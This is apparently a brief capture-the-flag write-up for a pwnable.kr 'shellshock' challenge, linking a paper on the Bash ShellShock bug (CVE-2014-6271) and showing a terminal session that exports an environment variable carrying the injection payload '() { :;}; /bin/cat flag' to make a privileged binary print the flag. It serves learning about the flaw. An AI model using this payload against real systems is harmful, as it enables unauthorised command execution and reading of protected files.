# shellshock

Bash ShellShock vulnerability

## Read about the ShellShock vuln

https://www.exploit-db.com/docs/english/48112-the-shellshock-attack-%5Bpaper%5D.pdf?ref=benheater.com

## Flag

```bash
shellshock@pwnable:~$ export bruh='() { :;}; /bin/cat flag'
shellshock@pwnable:~$ ./shellshock
only if I knew CVE-2014-6271 ten years ago..!!
Segmentation fault (core dumped)
```